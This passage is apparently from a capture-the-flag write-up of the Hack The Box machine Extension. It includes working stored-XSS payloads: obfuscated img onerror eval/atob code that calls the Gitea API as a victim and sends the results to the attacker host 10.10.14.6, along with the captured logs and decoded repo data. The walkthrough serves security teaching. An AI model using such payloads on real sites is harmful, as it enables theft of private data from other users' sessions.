> A cookie with the `HttpOnly` attribute is inaccessible to the JavaScript [`Document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) API; it’s only sent to the server. For example, cookies that persist in server-side sessions don’t need to be available to JavaScript and should have the `HttpOnly` attribute. This precaution helps mitigate cross-site scripting ([XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_(xss))) attacks.

### Gitea Data

#### Gitea API

There is a link at the bottom of the Gitea page that leads to `http://dev.snippet.htb/api/swagger`, which is the API documents. I’ve seen Swagger documents before (in [Backend](/2022/04/12/htb-backend.html#site) and [BackendTwo](/2022/05/02/htb-backendtwo.html#api-admin-access)). It’s a really nice interactive documents.

![image-20220623171024971](https://0xdfimages.gitlab.io/img/image-20220623171024971.png)

Within each category, there’s a list of the endpoints:

![image-20220623171117718](https://0xdfimages.gitlab.io/img/image-20220623171117718.png)

And each of those expands to show details, as well as allows for using the endpoint from within the browser:

![image-20220623171151922](https://0xdfimages.gitlab.io/img/image-20220623171151922.png)

#### List Repos

Seeing what repos the user being exploited can access would be interesting. There’s a `/repos/search` endpoint with a ton of parameters:

![image-20220623171328225](https://0xdfimages.gitlab.io/img/image-20220623171328225.png)

Visiting `/api/v1/repos/search` with no parameters returns the only repo Jean has access to:

![image-20220623171433997](https://0xdfimages.gitlab.io/img/image-20220623171433997.png)

After some trial and error, I am able to fetch the results via this query:

```

fetch("http://dev.snippet.htb/api/v1/repos/search").then(response => response.json()).then(data=>fetch("http://10.10.14.6/"+btoa(JSON.stringify(data))));

```

Which makes a payload:

```

<><img SRC=http://10.10.14.6/test.img onerror=eval.call`${"eval\x28atob`ZmV0Y2goImh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL3NlYXJjaCIpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKS50aGVuKGRhdGE9PmZldGNoKCJodHRwOi8vMTAuMTAuMTQuNi8iK2J0b2EoSlNPTi5zdHJpbmdpZnkoZGF0YSkpKSk7Cg==`\x29"}` />

```

After submitting as an issue, I get this from my browser:

```
10.10.14.6 - - [23/Jul/2022 21:31:55] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 21:31:55] "GET /eyJvayI6dHJ1ZSwiZGF0YSI6W3siaWQiOjgsIm93bmVyIjp7ImlkIjoyLCJsb2dpbiI6ImplYW4iLCJmdWxsX25hbWUiOiIiLCJlbWFpbCI6ImplYW5Ac25pcHBldC5odGIiLCJhdmF0YXJfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi91c2VyL2F2YXRhci9qZWFuLy0xIiwibGFuZ3VhZ2UiOiIiLCJpc19hZG1pbiI6ZmFsc2UsImxhc3RfbG9naW4iOiIwMDAxLTAxLTAxVDAwOjAwOjAwWiIsImNyZWF0ZWQiOiIyMDIxLTEyLTI3VDAwOjA1OjM0WiIsInJlc3RyaWN0ZWQiOmZhbHNlLCJhY3RpdmUiOmZhbHNlLCJwcm9oaWJpdF9sb2dpbiI6ZmFsc2UsImxvY2F0aW9uIjoiIiwid2Vic2l0ZSI6IiIsImRlc2NyaXB0aW9uIjoiIiwidmlzaWJpbGl0eSI6InB1YmxpYyIsImZvbGxvd2Vyc19jb3VudCI6MCwiZm9sbG93aW5nX2NvdW50IjowLCJzdGFycmVkX3JlcG9zX2NvdW50IjowLCJ1c2VybmFtZSI6ImplYW4ifSwibmFtZSI6ImV4dGVuc2lvbiIsImZ1bGxfbmFtZSI6ImplYW4vZXh0ZW5zaW9uIiwiZGVzY3JpcHRpb24iOiIiLCJlbXB0eSI6ZmFsc2UsInByaXZhdGUiOnRydWUsImZvcmsiOmZhbHNlLCJ0ZW1wbGF0ZSI6ZmFsc2UsInBhcmVudCI6bnVsbCwibWlycm9yIjpmYWxzZSwic2l6ZSI6MjIsImh0bWxfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9qZWFuL2V4dGVuc2lvbiIsInNzaF91cmwiOiJnaXRAbG9jYWxob3N0OmplYW4vZXh0ZW5zaW9uLmdpdCIsImNsb25lX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvamVhbi9leHRlbnNpb24uZ2l0Iiwib3JpZ2luYWxfdXJsIjoiIiwid2Vic2l0ZSI6IiIsInN0YXJzX2NvdW50IjowLCJmb3Jrc19jb3VudCI6MCwid2F0Y2hlcnNfY291bnQiOjEsIm9wZW5faXNzdWVzX2NvdW50IjoxLCJvcGVuX3ByX2NvdW50ZXIiOjAsInJlbGVhc2VfY291bnRlciI6MCwiZGVmYXVsdF9icmFuY2giOiJtYXN0ZXIiLCJhcmNoaXZlZCI6ZmFsc2UsImNyZWF0ZWRfYXQiOiIyMDIyLTA2LTIwVDE0OjA3OjAyWiIsInVwZGF0ZWRfYXQiOiIyMDIyLTA2LTIzVDE3OjIzOjQwWiIsInBlcm1pc3Npb25zIjp7ImFkbWluIjp0cnVlLCJwdXNoIjp0cnVlLCJwdWxsIjp0cnVlfSwiaGFzX2lzc3VlcyI6dHJ1ZSwiaW50ZXJuYWxfdHJhY2tlciI6eyJlbmFibGVfdGltZV90cmFja2VyIjp0cnVlLCJhbGxvd19vbmx5X2NvbnRyaWJ1dG9yc190b190cmFja190aW1lIjp0cnVlLCJlbmFibGVfaXNzdWVfZGVwZW5kZW5jaWVzIjp0cnVlfSwiaGFzX3dpa2kiOnRydWUsImhhc19wdWxsX3JlcXVlc3RzIjp0cnVlLCJoYXNfcHJvamVjdHMiOnRydWUsImlnbm9yZV93aGl0ZXNwYWNlX2NvbmZsaWN0cyI6ZmFsc2UsImFsbG93X21lcmdlX2NvbW1pdHMiOnRydWUsImFsbG93X3JlYmFzZSI6dHJ1ZSwiYWxsb3dfcmViYXNlX2V4cGxpY2l0Ijp0cnVlLCJhbGxvd19zcXVhc2hfbWVyZ2UiOnRydWUsImRlZmF1bHRfbWVyZ2Vfc3R5bGUiOiJtZXJnZSIsImF2YXRhcl91cmwiOiIiLCJpbnRlcm5hbCI6ZmFsc2UsIm1pcnJvcl9pbnRlcnZhbCI6IiJ9XX0= HTTP/1.1" 404 -

```

That’s the same results I got in the browser above. After a minute, there’s a hit from Extension:

```
10.10.10.224 - - [23/Jul/2022 21:33:00] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 21:33:00] "GET /eyJvayI6dHJ1ZSwiZGF0YSI6W3siaWQiOjIsIm93bmVyIjp7ImlkIjozLCJsb2dpbiI6ImNoYXJsaWUiLCJmdWxsX25hbWUiOiIiLCJlbWFpbCI6ImNoYXJsaWVAc25pcHBldC5odGIiLCJhdmF0YXJfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi91c2VyL2F2YXRhci9jaGFybGllLy0xIiwibGFuZ3VhZ2UiOiIiLCJpc19hZG1pbiI6ZmFsc2UsImxhc3RfbG9naW4iOiIwMDAxLTAxLTAxVDAwOjAwOjAwWiIsImNyZWF0ZWQiOiIyMDIxLTEyLTI3VDAwOjA1OjU5WiIsInJlc3RyaWN0ZWQiOmZhbHNlLCJhY3RpdmUiOmZhbHNlLCJwcm9oaWJpdF9sb2dpbiI6ZmFsc2UsImxvY2F0aW9uIjoiIiwid2Vic2l0ZSI6IiIsImRlc2NyaXB0aW9uIjoiIiwidmlzaWJpbGl0eSI6InB1YmxpYyIsImZvbGxvd2Vyc19jb3VudCI6MCwiZm9sbG93aW5nX2NvdW50IjowLCJzdGFycmVkX3JlcG9zX2NvdW50IjowLCJ1c2VybmFtZSI6ImNoYXJsaWUifSwibmFtZSI6ImJhY2t1cHMiLCJmdWxsX25hbWUiOiJjaGFybGllL2JhY2t1cHMiLCJkZXNjcmlwdGlvbiI6IkJhY2t1cCBvZiBteSBob21lIGRpcmVjdG9yeSIsImVtcHR5IjpmYWxzZSwicHJpdmF0ZSI6dHJ1ZSwiZm9yayI6ZmFsc2UsInRlbXBsYXRlIjpmYWxzZSwicGFyZW50IjpudWxsLCJtaXJyb3IiOmZhbHNlLCJzaXplIjoyNCwiaHRtbF91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3VwcyIsInNzaF91cmwiOiJnaXRAbG9jYWxob3N0OmNoYXJsaWUvYmFja3Vwcy5naXQiLCJjbG9uZV91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3Vwcy5naXQiLCJvcmlnaW5hbF91cmwiOiIiLCJ3ZWJzaXRlIjoiIiwic3RhcnNfY291bnQiOjAsImZvcmtzX2NvdW50IjowLCJ3YXRjaGVyc19jb3VudCI6MSwib3Blbl9pc3N1ZXNfY291bnQiOi0yNSwib3Blbl9wcl9jb3VudGVyIjowLCJyZWxlYXNlX2NvdW50ZXIiOjAsImRlZmF1bHRfYnJhbmNoIjoibWFzdGVyIiwiYXJjaGl2ZWQiOmZhbHNlLCJjcmVhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyMjoxNloiLCJ1cGRhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyNDozMFoiLCJwZXJtaXNzaW9ucyI6eyJhZG1pbiI6dHJ1ZSwicHVzaCI6dHJ1ZSwicHVsbCI6dHJ1ZX0sImhhc19pc3N1ZXMiOnRydWUsImludGVybmFsX3RyYWNrZXIiOnsiZW5hYmxlX3RpbWVfdHJhY2tlciI6dHJ1ZSwiYWxsb3dfb25seV9jb250cmlidXRvcnNfdG9fdHJhY2tfdGltZSI6dHJ1ZSwiZW5hYmxlX2lzc3VlX2RlcGVuZGVuY2llcyI6dHJ1ZX0sImhhc193aWtpIjp0cnVlLCJoYXNfcHVsbF9yZXF1ZXN0cyI6dHJ1ZSwiaGFzX3Byb2plY3RzIjp0cnVlLCJpZ25vcmVfd2hpdGVzcGFjZV9jb25mbGljdHMiOmZhbHNlLCJhbGxvd19tZXJnZV9jb21taXRzIjp0cnVlLCJhbGxvd19yZWJhc2UiOnRydWUsImFsbG93X3JlYmFzZV9leHBsaWNpdCI6dHJ1ZSwiYWxsb3dfc3F1YXNoX21lcmdlIjp0cnVlLCJkZWZhdWx0X21lcmdlX3N0eWxlIjoibWVyZ2UiLCJhdmF0YXJfdXJsIjoiIiwiaW50ZXJuYWwiOmZhbHNlLCJtaXJyb3JfaW50ZXJ2YWwiOiIifSx7ImlkIjo4LCJvd25lciI6eyJpZCI6MiwibG9naW4iOiJqZWFuIiwiZnVsbF9uYW1lIjoiIiwiZW1haWwiOiJqZWFuQHNuaXBwZXQuaHRiIiwiYXZhdGFyX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvdXNlci9hdmF0YXIvamVhbi8tMSIsImxhbmd1YWdlIjoiIiwiaXNfYWRtaW4iOmZhbHNlLCJsYXN0X2xvZ2luIjoiMDAwMS0wMS0wMVQwMDowMDowMFoiLCJjcmVhdGVkIjoiMjAyMS0xMi0yN1QwMDowNTozNFoiLCJyZXN0cmljdGVkIjpmYWxzZSwiYWN0aXZlIjpmYWxzZSwicHJvaGliaXRfbG9naW4iOmZhbHNlLCJsb2NhdGlvbiI6IiIsIndlYnNpdGUiOiIiLCJkZXNjcmlwdGlvbiI6IiIsInZpc2liaWxpdHkiOiJwdWJsaWMiLCJmb2xsb3dlcnNfY291bnQiOjAsImZvbGxvd2luZ19jb3VudCI6MCwic3RhcnJlZF9yZXBvc19jb3VudCI6MCwidXNlcm5hbWUiOiJqZWFuIn0sIm5hbWUiOiJleHRlbnNpb24iLCJmdWxsX25hbWUiOiJqZWFuL2V4dGVuc2lvbiIsImRlc2NyaXB0aW9uIjoiIiwiZW1wdHkiOmZhbHNlLCJwcml2YXRlIjp0cnVlLCJmb3JrIjpmYWxzZSwidGVtcGxhdGUiOmZhbHNlLCJwYXJlbnQiOm51bGwsIm1pcnJvciI6ZmFsc2UsInNpemUiOjIyLCJodG1sX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvamVhbi9leHRlbnNpb24iLCJzc2hfdXJsIjoiZ2l0QGxvY2FsaG9zdDpqZWFuL2V4dGVuc2lvbi5naXQiLCJjbG9uZV91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2plYW4vZXh0ZW5zaW9uLmdpdCIsIm9yaWdpbmFsX3VybCI6IiIsIndlYnNpdGUiOiIiLCJzdGFyc19jb3VudCI6MCwiZm9ya3NfY291bnQiOjAsIndhdGNoZXJzX2NvdW50IjoxLCJvcGVuX2lzc3Vlc19jb3VudCI6MSwib3Blbl9wcl9jb3VudGVyIjowLCJyZWxlYXNlX2NvdW50ZXIiOjAsImRlZmF1bHRfYnJhbmNoIjoibWFzdGVyIiwiYXJjaGl2ZWQiOmZhbHNlLCJjcmVhdGVkX2F0IjoiMjAyMi0wNi0yMFQxNDowNzowMloiLCJ1cGRhdGVkX2F0IjoiMjAyMi0wNi0yM1QxNzoyMzo0MFoiLCJwZXJtaXNzaW9ucyI6eyJhZG1pbiI6ZmFsc2UsInB1c2giOnRydWUsInB1bGwiOnRydWV9LCJoYXNfaXNzdWVzIjp0cnVlLCJpbnRlcm5hbF90cmFja2VyIjp7ImVuYWJsZV90aW1lX3RyYWNrZXIiOnRydWUsImFsbG93X29ubHlfY29udHJpYnV0b3JzX3RvX3RyYWNrX3RpbWUiOnRydWUsImVuYWJsZV9pc3N1ZV9kZXBlbmRlbmNpZXMiOnRydWV9LCJoYXNfd2lraSI6dHJ1ZSwiaGFzX3B1bGxfcmVxdWVzdHMiOnRydWUsImhhc19wcm9qZWN0cyI6dHJ1ZSwiaWdub3JlX3doaXRlc3BhY2VfY29uZmxpY3RzIjpmYWxzZSwiYWxsb3dfbWVyZ2VfY29tbWl0cyI6dHJ1ZSwiYWxsb3dfcmViYXNlIjp0cnVlLCJhbGxvd19yZWJhc2VfZXhwbGljaXQiOnRydWUsImFsbG93X3NxdWFzaF9tZXJnZSI6dHJ1ZSwiZGVmYXVsdF9tZXJnZV9zdHlsZSI6Im1lcmdlIiwiYXZhdGFyX3VybCI6IiIsImludGVybmFsIjpmYWxzZSwibWlycm9yX2ludGVydmFsIjoiIn1dfQ== HTTP/1.1" 404 -

```

There’s more data in the one from Extension. It decodes to:

```

oxdf@hacky$ echo "eyJvayI6dHJ1ZSwiZGF0YSI6W3siaWQiOjIsIm93bmVyIjp7ImlkIjozLCJsb2dpbiI6ImNoYXJsaWUiLCJmdWxsX25hbWUiOiIiLCJlbWFpbCI6ImNoYXJsaWVAc25pcHBldC5odGIiLCJhdmF0YXJfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi91c2VyL2F2YXRhci9jaGFybGllLy0xIiwibGFuZ3VhZ2UiOiIiLCJpc19hZG1pbiI6ZmFsc2UsImxhc3RfbG9naW4iOiIwMDAxLTAxLTAxVDAwOjAwOjAwWiIsImNyZWF0ZWQiOiIyMDIxLTEyLTI3VDAwOjA1OjU5WiIsInJlc3RyaWN0ZWQiOmZhbHNlLCJhY3RpdmUiOmZhbHNlLCJwcm9oaWJpdF9sb2dpbiI6ZmFsc2UsImxvY2F0aW9uIjoiIiwid2Vic2l0ZSI6IiIsImRlc2NyaXB0aW9uIjoiIiwidmlzaWJpbGl0eSI6InB1YmxpYyIsImZvbGxvd2Vyc19jb3VudCI6MCwiZm9sbG93aW5nX2NvdW50IjowLCJzdGFycmVkX3JlcG9zX2NvdW50IjowLCJ1c2VybmFtZSI6ImNoYXJsaWUifSwibmFtZSI6ImJhY2t1cHMiLCJmdWxsX25hbWUiOiJjaGFybGllL2JhY2t1cHMiLCJkZXNjcmlwdGlvbiI6IkJhY2t1cCBvZiBteSBob21lIGRpcmVjdG9yeSIsImVtcHR5IjpmYWxzZSwicHJpdmF0ZSI6dHJ1ZSwiZm9yayI6ZmFsc2UsInRlbXBsYXRlIjpmYWxzZSwicGFyZW50IjpudWxsLCJtaXJyb3IiOmZhbHNlLCJzaXplIjoyNCwiaHRtbF91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3VwcyIsInNzaF91cmwiOiJnaXRAbG9jYWxob3N0OmNoYXJsaWUvYmFja3Vwcy5naXQiLCJjbG9uZV91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2NoYXJsaWUvYmFja3Vwcy5naXQiLCJvcmlnaW5hbF91cmwiOiIiLCJ3ZWJzaXRlIjoiIiwic3RhcnNfY291bnQiOjAsImZvcmtzX2NvdW50IjowLCJ3YXRjaGVyc19jb3VudCI6MSwib3Blbl9pc3N1ZXNfY291bnQiOi0yNSwib3Blbl9wcl9jb3VudGVyIjowLCJyZWxlYXNlX2NvdW50ZXIiOjAsImRlZmF1bHRfYnJhbmNoIjoibWFzdGVyIiwiYXJjaGl2ZWQiOmZhbHNlLCJjcmVhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyMjoxNloiLCJ1cGRhdGVkX2F0IjoiMjAyMi0wMS0wNFQyMToyNDozMFoiLCJwZXJtaXNzaW9ucyI6eyJhZG1pbiI6dHJ1ZSwicHVzaCI6dHJ1ZSwicHVsbCI6dHJ1ZX0sImhhc19pc3N1ZXMiOnRydWUsImludGVybmFsX3RyYWNrZXIiOnsiZW5hYmxlX3RpbWVfdHJhY2tlciI6dHJ1ZSwiYWxsb3dfb25seV9jb250cmlidXRvcnNfdG9fdHJhY2tfdGltZSI6dHJ1ZSwiZW5hYmxlX2lzc3VlX2RlcGVuZGVuY2llcyI6dHJ1ZX0sImhhc193aWtpIjp0cnVlLCJoYXNfcHVsbF9yZXF1ZXN0cyI6dHJ1ZSwiaGFzX3Byb2plY3RzIjp0cnVlLCJpZ25vcmVfd2hpdGVzcGFjZV9jb25mbGljdHMiOmZhbHNlLCJhbGxvd19tZXJnZV9jb21taXRzIjp0cnVlLCJhbGxvd19yZWJhc2UiOnRydWUsImFsbG93X3JlYmFzZV9leHBsaWNpdCI6dHJ1ZSwiYWxsb3dfc3F1YXNoX21lcmdlIjp0cnVlLCJkZWZhdWx0X21lcmdlX3N0eWxlIjoibWVyZ2UiLCJhdmF0YXJfdXJsIjoiIiwiaW50ZXJuYWwiOmZhbHNlLCJtaXJyb3JfaW50ZXJ2YWwiOiIifSx7ImlkIjo4LCJvd25lciI6eyJpZCI6MiwibG9naW4iOiJqZWFuIiwiZnVsbF9uYW1lIjoiIiwiZW1haWwiOiJqZWFuQHNuaXBwZXQuaHRiIiwiYXZhdGFyX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvdXNlci9hdmF0YXIvamVhbi8tMSIsImxhbmd1YWdlIjoiIiwiaXNfYWRtaW4iOmZhbHNlLCJsYXN0X2xvZ2luIjoiMDAwMS0wMS0wMVQwMDowMDowMFoiLCJjcmVhdGVkIjoiMjAyMS0xMi0yN1QwMDowNTozNFoiLCJyZXN0cmljdGVkIjpmYWxzZSwiYWN0aXZlIjpmYWxzZSwicHJvaGliaXRfbG9naW4iOmZhbHNlLCJsb2NhdGlvbiI6IiIsIndlYnNpdGUiOiIiLCJkZXNjcmlwdGlvbiI6IiIsInZpc2liaWxpdHkiOiJwdWJsaWMiLCJmb2xsb3dlcnNfY291bnQiOjAsImZvbGxvd2luZ19jb3VudCI6MCwic3RhcnJlZF9yZXBvc19jb3VudCI6MCwidXNlcm5hbWUiOiJqZWFuIn0sIm5hbWUiOiJleHRlbnNpb24iLCJmdWxsX25hbWUiOiJqZWFuL2V4dGVuc2lvbiIsImRlc2NyaXB0aW9uIjoiIiwiZW1wdHkiOmZhbHNlLCJwcml2YXRlIjp0cnVlLCJmb3JrIjpmYWxzZSwidGVtcGxhdGUiOmZhbHNlLCJwYXJlbnQiOm51bGwsIm1pcnJvciI6ZmFsc2UsInNpemUiOjIyLCJodG1sX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvamVhbi9leHRlbnNpb24iLCJzc2hfdXJsIjoiZ2l0QGxvY2FsaG9zdDpqZWFuL2V4dGVuc2lvbi5naXQiLCJjbG9uZV91cmwiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2plYW4vZXh0ZW5zaW9uLmdpdCIsIm9yaWdpbmFsX3VybCI6IiIsIndlYnNpdGUiOiIiLCJzdGFyc19jb3VudCI6MCwiZm9ya3NfY291bnQiOjAsIndhdGNoZXJzX2NvdW50IjoxLCJvcGVuX2lzc3Vlc19jb3VudCI6MSwib3Blbl9wcl9jb3VudGVyIjowLCJyZWxlYXNlX2NvdW50ZXIiOjAsImRlZmF1bHRfYnJhbmNoIjoibWFzdGVyIiwiYXJjaGl2ZWQiOmZhbHNlLCJjcmVhdGVkX2F0IjoiMjAyMi0wNi0yMFQxNDowNzowMloiLCJ1cGRhdGVkX2F0IjoiMjAyMi0wNi0yM1QxNzoyMzo0MFoiLCJwZXJtaXNzaW9ucyI6eyJhZG1pbiI6ZmFsc2UsInB1c2giOnRydWUsInB1bGwiOnRydWV9LCJoYXNfaXNzdWVzIjp0cnVlLCJpbnRlcm5hbF90cmFja2VyIjp7ImVuYWJsZV90aW1lX3RyYWNrZXIiOnRydWUsImFsbG93X29ubHlfY29udHJpYnV0b3JzX3RvX3RyYWNrX3RpbWUiOnRydWUsImVuYWJsZV9pc3N1ZV9kZXBlbmRlbmNpZXMiOnRydWV9LCJoYXNfd2lraSI6dHJ1ZSwiaGFzX3B1bGxfcmVxdWVzdHMiOnRydWUsImhhc19wcm9qZWN0cyI6dHJ1ZSwiaWdub3JlX3doaXRlc3BhY2VfY29uZmxpY3RzIjpmYWxzZSwiYWxsb3dfbWVyZ2VfY29tbWl0cyI6dHJ1ZSwiYWxsb3dfcmViYXNlIjp0cnVlLCJhbGxvd19yZWJhc2VfZXhwbGljaXQiOnRydWUsImFsbG93X3NxdWFzaF9tZXJnZSI6dHJ1ZSwiZGVmYXVsdF9tZXJnZV9zdHlsZSI6Im1lcmdlIiwiYXZhdGFyX3VybCI6IiIsImludGVybmFsIjpmYWxzZSwibWlycm9yX2ludGVydmFsIjoiIn1dfQ=="
> | base64 -d | jq -r '.data[].full_name'
charlie/backups
jean/extension

```

That’s an additional repo called backups owned by charlie!

#### List Files

I’ll use to list the contents of the backups repo:

![image-20220623173658761](https://0xdfimages.gitlab.io/img/image-20220623173658761.png)

The encoded JS is:

```

fetch("http://dev.snippet.htb/api/v1/repos/charlie/backups/contents").then(response => response.json()).then(data => fetch("http://10.10.14.6/"+ btoa(JSON.stringify(data))));

```

Which encodes as:

```

<><img SRC=http://10.10.14.6/test.img onerror=eval.call`${"eval\x28atob`ZmV0Y2goImh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cyIpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UuanNvbigpKS50aGVuKGRhdGEgPT4gZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC42LyIrIGJ0b2EoSlNPTi5zdHJpbmdpZnkoZGF0YSkpKSk7Cg==`\x29"}` />

```

The result from my browser is interesting:

```
10.10.14.6 - - [23/Jul/2022 23:14:02] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 23:14:02] "GET /test.img HTTP/1.1" 404 -
10.10.14.6 - - [23/Jul/2022 23:14:03] code 404, message File not found
10.10.14.6 - - [23/Jul/2022 23:14:03] "GET /eyJkb2N1bWVudGF0aW9uX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3N3YWdnZXIiLCJlcnJvcnMiOm51bGwsIm1lc3NhZ2UiOiJOb3QgRm91bmQifQ== HTTP/1.1" 404 -

```

It’s an error (because I’m not authorized):

```

oxdf@hacky$ echo "eyJkb2N1bWVudGF0aW9uX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3N3YWdnZXIiLCJlcnJvcnMiOm51bGwsIm1lc3NhZ2UiOiJOb3QgRm91bmQifQ==" | base64 -d
{"documentation_url":"http://dev.snippet.htb/api/swagger","errors":null,"message":"Not Found"}

```

But when Extension loads it:

```
10.10.10.224 - - [23/Jul/2022 23:16:25] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 23:16:25] "GET /test.img HTTP/1.1" 404 -
10.10.10.224 - - [23/Jul/2022 23:16:25] code 404, message File not found
10.10.10.224 - - [23/Jul/2022 23:16:25] "GET /W3sibmFtZSI6ImJhY2t1cC50YXIuZ3oiLCJwYXRoIjoiYmFja3VwLnRhci5neiIsInNoYSI6ImMyNWNiOWQxZjFkODNiZGFkNDFkYWQ0MDM4NzRjMmM5YjkxZDBiNTciLCJ0eXBlIjoiZmlsZSIsInNpemUiOjQzMTYsImVuY29kaW5nIjpudWxsLCJjb250ZW50IjpudWxsLCJ0YXJnZXQiOm51bGwsInVybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cy9iYWNrdXAudGFyLmd6P3JlZj1tYXN0ZXIiLCJodG1sX3VybCI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvY2hhcmxpZS9iYWNrdXBzL3NyYy9icmFuY2gvbWFzdGVyL2JhY2t1cC50YXIuZ3oiLCJnaXRfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9hcGkvdjEvcmVwb3MvY2hhcmxpZS9iYWNrdXBzL2dpdC9ibG9icy9jMjVjYjlkMWYxZDgzYmRhZDQxZGFkNDAzODc0YzJjOWI5MWQwYjU3IiwiZG93bmxvYWRfdXJsIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9jaGFybGllL2JhY2t1cHMvcmF3L2JyYW5jaC9tYXN0ZXIvYmFja3VwLnRhci5neiIsInN1Ym1vZHVsZV9naXRfdXJsIjpudWxsLCJfbGlua3MiOnsic2VsZiI6Imh0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cy9iYWNrdXAudGFyLmd6P3JlZj1tYXN0ZXIiLCJnaXQiOiJodHRwOi8vZGV2LnNuaXBwZXQuaHRiL2FwaS92MS9yZXBvcy9jaGFybGllL2JhY2t1cHMvZ2l0L2Jsb2JzL2MyNWNiOWQxZjFkODNiZGFkNDFkYWQ0MDM4NzRjMmM5YjkxZDBiNTciLCJodG1sIjoiaHR0cDovL2Rldi5zbmlwcGV0Lmh0Yi9jaGFybGllL2JhY2t1cHMvc3JjL2JyYW5jaC9tYXN0ZXIvYmFja3VwLnRhci5neiJ9fV0= HTTP/1.1" 404 -

```

Decoding the base64 gives all the information about the files in the repo:

```

[
  {
    "name": "backup.tar.gz",
    "path": "backup.tar.gz",
    "sha": "c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
    "type": "file",
    "size": 4316,
    "encoding": null,
    "content": null,
    "target": null,
    "url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master",
    "html_url": "http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz",
    "git_url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
    "download_url": "http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz",
    "submodule_git_url": null,
    "_links": {
      "self": "http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master",
      "git": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
      "html": "http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz"
    }
  }
]

```

There’s a single file, `backup.tar.gz`.

#### Understand Metadata

I’ll look at `/api/v1/repos/jean/extension/contents/` to see what this data means. This returns four items, for the four files in that repo:

[![image-20220623192110955](https://0xdfimages.gitlab.io/img/image-20220623192110955.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220623192110955.png)

There’s a bunch of URLs for each file.

`url` returns JSON data that includes information about the files, as well as a base64 encoded representation of the file:

[![image-20220623192243838](https://0xdfimages.gitlab.io/img/image-20220623192243838.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220623192243838.png)

`html_url` gives the link to the file like I might view it on the Gitea site:

![image-20220623192316262](https://0xdfimages.gitlab.io/img/image-20220623192316262.png)

`git_url` gives similar to the `url`, but it has less information:

[![image-20220623192404001](https://0xdfimages.gitlab.io/img/image-20220623192404001.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220623192404001.png)

In this repo, the `download_url` is null for all the files.

The base64-blobs that are named `content` decode to the raw file:

```

oxdf@hacky$ echo "IyMgR2l0ZWEgSXNzdWUgUHJldmlldwoKVGhpcyBleHRlbnNpb24gaXMgZGVzaWduZWQgdG8gYWlkIGluIHRoZSB2aWV3aW5nIG9mIElzc3VlcyBvbiBHaXRlYS4gSXQgZGlzcGxheXMgdGhlIGJvZHkgb2YgZWFjaCBpc3N1ZSBvbiB0aGUgbWFpbiBpc3N1ZSBwYWdlIGluIEdpdGVhLgoKTWVtYmVycyBvZiBvdXIgdGVhbSBhcmUgYWxyZWFkeSB1c2luZyBpdCB0byB0cmFjayBpc3N1ZXMgb24gaW50ZXJuYWwgcmVwb3MuCg==" |base64 -d
## Gitea Issue Preview

This extension is designed to aid in the viewing of Issues on Gitea. It displays the body of each issue on the main issue page in Gitea.

Members of our team are already using it to track issues on internal repos.

```

#### Download backup.tar.gz

I’ll use another XSS payload to download the file:

```

fetch('http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz').then(response => response.json()).then(data => fetch('http://10.10.14.6/'+ btoa(JSON.stringify(data))));

```

Which encodes to:

```

